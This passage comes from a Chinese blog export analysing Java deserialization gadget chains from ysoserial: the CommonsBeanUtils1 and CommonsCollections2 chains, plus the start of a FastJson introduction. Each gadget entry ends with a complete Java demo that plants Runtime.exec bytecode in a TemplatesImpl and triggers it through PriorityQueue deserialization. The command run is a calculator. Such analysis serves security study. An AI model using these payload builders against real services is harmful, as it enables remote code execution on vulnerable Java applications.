<li>CommonsCollections7</li>
<li>CommonsCollections10</li>
</ul>
<h2 id="commonscollections3-2-1"><a href="#commonscollections3-2-1" class="headerlink" title="commonscollections3.2.1"></a>commonscollections3.2.1</h2><ul>
<li>CommonsCollections1</li>
<li>CommonsCollections3</li>
<li>CommonsCollections5</li>
<li>CommonsCollections6</li>
<li>CommonsCollections7</li>
<li>CommonsCollections9</li>
<li>CommonsCollections10</li>
</ul>
<h2 id="commonscollections4-0"><a href="#commonscollections4-0" class="headerlink" title="commonscollections4.0"></a>commonscollections4.0</h2><ul>
<li>CommonsCollections2</li>
<li>CommonsCollections4</li>
<li>CommonsCollections8</li>
</ul>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="未配置security-manager"><a href="#未配置security-manager" class="headerlink" title="未配置security-manager"></a>未配置security-manager</h2><ul>
<li>CommonsCollections5</li>
<li>CommonsCollections9</li>
</ul>
<h2 id="lt-JDK8u72"><a href="#lt-JDK8u72" class="headerlink" title="&lt;= JDK8u72"></a>&lt;= JDK8u72</h2><ul>
<li>CommonsCollections1</li>
<li>CommonsCollections3</li>
</ul>
<blockquote>
<p>在实际使用中，在3.x版本下使用6，7，10来进行测试会更好，没有太多的限制；在4.0版本下使用4，8来进行测试。</p>
</blockquote>
<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>其实分析完上述的payload之后，很容易发现，在很多链中，都是由其他链分断合并而来。在找这样的利用链时，可以从执行最终的命令触发开始，往前寻找能够触发这一条件的方法，以及调用这些方法类，然后进行筛选，这样一层一层往外找，直到找到一个最外层。</p>
<p>对于外层触发点，一般需要具有以下条件:</p>
<ul>
<li>可被序列化</li>
<li>重写了readObject类</li>
<li>readObject类中有其他函数(除类似<code>defaultReadObject</code>之类的)调用</li>
</ul>
<p>对于中间承接点，一般需要具有以下条件:</p>
<ul>
<li>可被序列化</li>
<li>该类的类属性有函数调用</li>
<li>实现了InvocationHandler，具有invoke函数(考虑动态代理的方式)</li>
</ul>
<p>对于命令执行点，一般需要具有以下条件:</p>
<ul>
<li>能够加载并实例化类</li>
<li>或者能够反射调用创建对象并调用方法</li>
</ul>
<p>这是我的一个直观的想法，可能已经有工具使用来自动化地分析与寻找这些点。例如<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">Gadget Inspector</a>。</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoseial之CommonsBeanUtils1分析</title>
    <url>/2020/05/09/ysoserial-commonsbeanutils1/</url>
    <content><![CDATA[<p>最近在复现shiro 721的时候，发现可以利用CommonsBeanUtils1这条利用链。虽然这条利用链中也用到了commonscollections中的类，但整个的思路有很大的不同，故将其进行一波分析。</p>
<a id="more"></a>

<p>这条链利用到了<font color=#008000>commons-beanutils</font>和<font color=#008000>commons-collections</font>。它与CommonsCollections2、4都是以PriorityQueue作为入口点的，调用到comparator.compare函数。不过这里用的不是commons-collections的4.0版本，TransformingComparator并不能被反序列化，不可用。</p>
<p>因此，采用的是<font color=#008000><code>BeanComparator</code></font>类。接下来就来分析BeanComparator类的compare函数引发的一系列故事。</p>
<p>整个的利用链如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">  -&gt;PriorityQueue.heapify()</span><br><span class="line">    -&gt;PriorityQueue.siftDown()</span><br><span class="line">      -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">        -&gt;BeanComparator.compare()</span><br><span class="line">          -&gt;PropertyUtils.getProperty()</span><br><span class="line">            -&gt;PropertyUtilsBean.getProperty()</span><br><span class="line">              -&gt;PropertyUtilsBean.getNestedProperty()</span><br><span class="line">                -&gt;PropertyUtilsBean.getSimpleProperty()</span><br><span class="line">                  -&gt;PropertyUtilsBean.invokeMethod()</span><br><span class="line">                    -&gt;method.invoke()</span><br><span class="line">                      -&gt;TemplatesImpl.getOutputProperties()</span><br><span class="line">                        -&gt;TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在commons-beanutils的最新版:1.9.4中也可以利用。</p>
</blockquote>
<h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><p>首先定位于BeanComparator.compare()函数。如下图所示:</p>
<p><img src="1.png" alt=""></p>
<p>然后跟进PropertyUtils.getProperty()函数。</p>
<p><img src="2.png" alt=""></p>
<p>继续跟进PropertyUtilsBean.getInstance().getProperty()函数。</p>
<p><img src="3.png" alt=""></p>
<p>然后跟进getNestedProperty()函数，如下图所示：</p>
<p><img src="4.png" alt=""></p>
<p>在此函数总它会根据传入的bean的类型进行不同的调用，由于我们传入的bean实际上是一个TemplatesImpl对象，因此会调用到getSimpleProperty()。跟进它。</p>
<p><img src="5.png" alt=""></p>
<p>同样的，在这里对bean进行一系列的判断以后，首先会根据property的值获取到propertyDescriptor，然后通过getReadMethod获取读取property的方法。最后会进入到invokeMethod函数，跟进这个函数。</p>
<p><img src="6.png" alt=""></p>
<p>在这个函数中，我们看到了一个很熟悉、很关键的函数<font color=#008000>method.invoke</font>。它用来执行对象的某个方法。对象就是此函数参数重的bean，values就是参数。在这条利用链中传入的是bean是TemplatesImpl对象，那么调用什么方法能够最终导致命令执行呢？定位到TemplatesImpl对象的<font color=#008000><code>getOutProperties()</code></font>方法。</p>
<p><img src="7.png" alt=""></p>
<p>在这个方法中会看到我们无比熟悉的<font color=#008000><code>newTransformer()</code></font>方法。</p>
<p>到这里整个利用链的分析就结束了。</p>
<h1 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h1><p>很显然的，整个过程当中需要使得bean为构造好的TemplatesImpl对象，然后property为outputProperties。定位到BeanComparator.compare函数。bean也就是o1为传入的参数，property为BeanComparator的类成员属性。因此，实例化BeanComparator类如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">"outputProperties"</span>);</span><br></pre></td></tr></table></figure>

<p>然后追踪参数o1的来源，定位到PriorityQueue.siftDownUsingComparator函数中的comparator.compare函数中的参数c，c来源于queue对象。因此，queue中存入TemplatesImpl对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line">queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line"></span><br><span class="line">Object[] queuearray = <span class="keyword">new</span> Object[]&#123;templates,templates&#125;;</span><br><span class="line"></span><br><span class="line">Field q1 = queue.getClass().getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">q1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">q1.set(queue,queuearray);</span><br></pre></td></tr></table></figure>

<h2 id="完整的demo"><a href="#完整的demo" class="headerlink" title="完整的demo"></a>完整的demo</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">        Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field2.set(templates,<span class="string">"ananaskr"</span>);</span><br><span class="line"></span><br><span class="line">        Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">"lowestSetBit"</span>);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line">        queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line"></span><br><span class="line">        Object[] queuearray = <span class="keyword">new</span> Object[]&#123;templates,templates&#125;;</span><br><span class="line"></span><br><span class="line">        Field q1 = queue.getClass().getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        q1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        q1.set(queue,queuearray);</span><br><span class="line"></span><br><span class="line">        Field c1 = comparator.getClass().getDeclaredField(<span class="string">"property"</span>);</span><br><span class="line">        c1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        c1.set(comparator,<span class="string">"outputProperties"</span>);</span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(queue);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下:</p>
<p><img src="8.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/" target="_blank" rel="noopener">Java 反序列化之 CommonsBeanUtils 分析</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsBeanUtils</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections2</title>
    <url>/2020/04/24/ysoserial-analyze-2/</url>
    <content><![CDATA[<p>这篇文章分析的是CommonsCollections2，与之前不同的是，它是在commonscollections4.0版本下的利用链。与CommonsCollections3一样的是，它也是利用TemplatesImpl对象来执行任意命令的。接下来就来具体分析分析它。</p>
<a id="more"></a>

<p>前面已经分析过的文章</p>
<p><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a></p>
<p>与CommonsCollections3一样的是，它也是利用<code>TemplatesImpl</code>来进行最终的命令执行<font color=#008000>(commons-collections:4.0版本下的利用链利用的都是<code>TemplatesImpl</code>)</font>。不同的是它用到了一个新类<code>PriorityQueue</code>来触发transform函数。<code>PriorityQueue</code>类。这个类有什么作用呢？让我们来分析分析。</p>
<p>整个反序列化利用链如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	-&gt;PriorityQueue.readObject()</span><br><span class="line">		-&gt;PriorityQueue.heapify()</span><br><span class="line">			-&gt;PriorityQueue.siftDown()</span><br><span class="line">				-&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">					-&gt;TransformingComparator.compare()</span><br><span class="line">						-&gt;InvokerTransformer.transform()</span><br><span class="line">							-&gt;TemplatesImpl.newTransform()</span><br></pre></td></tr></table></figure>


<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>首先在反序列化的过程中所需要用的类必须实现了<code>Serilizable</code>类。<code>PriorityQueue</code>也不例外。观察它的<code>readObject</code>类。</p>
<p><img src="1.png" alt=""></p>
<p>前面的几行都是普通的反序列化函数，让我们直接看看<code>heapify</code>。</p>
<p><img src="2.png" alt=""></p>
<p><code>heapify</code>函数连直接调用了<code>siftDown</code>，跟进<code>siftDown</code>。</p>
<p><img src="3.png" alt=""></p>
<p>若<code>comparator</code>不为空，则进入了<code>SiftDownUsingComparator</code>函数，跟进它。</p>
<p><img src="4.png" alt=""></p>
<p>在<code>SiftDownUsingComparator</code>函数中，继续跟进<code>comparator.compare</code>函数。此时进入的是<code>TransformingComparator</code>的compare函数，如下所示</p>
<p><img src="5.png" alt=""></p>
<p>在这里就看到了熟悉的<code>this.transformer.transform()</code>。在CommonsCollections2中利用的是<code>InvokerTransformer</code>的反射机制来调用<code>newTransformer</code>函数，从而进入利用TemplatesImpl对象的RCE。除了InvokerTransformer外，CommonsCollection3中的<code>InstantiateTransformer</code>触发<code>TrAXFilter</code>初始化也能达到同样的效果，不过这是CommonsCollections4使用的方法。</p>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>根据上面的分析可以得知，需要指定<code>PriorityQueue</code>类的<code>comparator</code>变量为<code>TransformingComparator</code>类，而<code>TransformingComparator</code>类中的Transformer需要是<code>InvokerTransformer</code>。很容易写出如下的payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        TransformingComparator transcomparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br></pre></td></tr></table></figure>

<p><code>newTransformer</code>函数的主体是TemplatesImpl对象，因此传入<code>this.transformer.transform(obj)</code>中的obj是一个TemplatesImpl对象。而该对象是PriorityQueue类的queue成员变量。因此，需要实例化一个PriorityQueue类，其成员变量comparator是一个TransformingComparator对象，成员变量queue是一个TemplatesImpl对象。</p>
<p>可以看到在<code>PriorityQueue</code>类中，<code>queue</code>这个成员变量被<code>transient</code>关键字修饰，是不能被序列化的。但是在<code>PriorityQueue</code>类的writeObject方法中，首先调用了ObjectOutputStream中的defaultWriteObject方法，该方法会执行默认的序列化机制，在进行序列化时，会先忽略掉被<code>transient</code>修饰的queue字段。然后调用了<code>writeObject</code>方法显示地将queue字段写入到ObjectOutputStream中。</p>
<p><img src="6.png" alt=""></p>
<p>查看<code>PriorityQueue</code>类的构造函数，需要两个参数，需要注意的是<code>initCapacity</code>在其注释中有说明需要1.5的Capacity，因此在初始化时将其设为2。初始化的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,transcomparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>然后queue里面的值为TemplatesImpl对象，使用CommonsCollections3中的构造方法，然后对Priority类中的queue成员进行设置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object[] queue = &#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"> </span><br><span class="line">Field field6 = priorityQueue.getClass().getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">field6.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field6.set(priorityQueue,queue);</span><br></pre></td></tr></table></figure>


<blockquote>
<p>ysoserial中实例化InvokerTransformer类时，它首先调用的toString方法，然后才将其换成newTransformer方法。这是因为在前面<code>priorityQueue.add(1)</code>也会调用到InvokerTransformer，这时候Integrity对象1并没有newTransformer方法会报错。</p>
</blockquote>
<h3 id="完整demo"><a href="#完整demo" class="headerlink" title="完整demo"></a>完整demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">         String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">         String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                 command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                 <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">         Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">         ClassPool pool = ClassPool.getDefault();</span><br><span class="line">         pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">         pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">         CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">         clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">         CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">         clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">         Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">         field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">         Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">         field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field2.set(templates,<span class="string">"ananaskr12345"</span>);</span><br><span class="line"></span><br><span class="line">         Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">         field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//create templates</span></span><br><span class="line"></span><br><span class="line">         InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">         TransformingComparator transcomparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">         PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,transcomparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">         priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">         Object[] queue = &#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Field field5 = transformer.getClass().getDeclaredField(<span class="string">"iMethodName"</span>);</span><br><span class="line">        field5.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field5.set(transformer, <span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        Field field6 = priorityQueue.getClass().getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        field6.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field6.set(priorityQueue,queue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(priorityQueue);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再加上ysoserial中的classFiles.java。运行结果如下:</p>
<p><img src="7.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.0kami.cn/2019/11/05/study-java-deserialized-commonscollections4/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections2,4,8</a></li>
<li><a href="https://www.cnblogs.com/tr1ple/p/12382559.html" target="_blank" rel="noopener">java反序列化-ysoserial-调试分析总结篇(2)</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson反序列化介绍</title>
    <url>/2020/05/20/fastjson-introduction/</url>
    <content><![CDATA[<p>之前虽然看了FastJson相关的内容，在复现的时候还是遇到了不少问题。因为比较详细地分析了下FastJson反序列化的过程，因此，记录了下来。</p>
<a id="more"></a>

<h2 id="FastJson简介"><a href="#FastJson简介" class="headerlink" title="FastJson简介"></a>FastJson简介</h2><p>FastJson自己实现了一套反序列化的机制，并没有使用默认的readObject()，在序列化反序列化的时候会进行一些操作，调用到一些setter和getter函数，从而造成命令执行。</p>
<h3 id="API介绍"><a href="#API介绍" class="headerlink" title="API介绍"></a>API介绍</h3><ul>
<li>序列化<ul>
<li>JSON.toJSONString()</li>
</ul>
</li>
<li>反序列化<ul>
<li>JSON.parse()   返回实际类型对象</li>
<li>JSON.parseObject()   返回JSONObject类型对象</li>
</ul>
</li>
</ul>
<blockquote>
<p>FastJson中提供特殊字段符<code>@type</code>。该字段可以指定反序列化任意类，并在反序列化过程中自动调用类中属性的公有的set、get、is方法。(这个is方法有待验证)</p>
</blockquote>
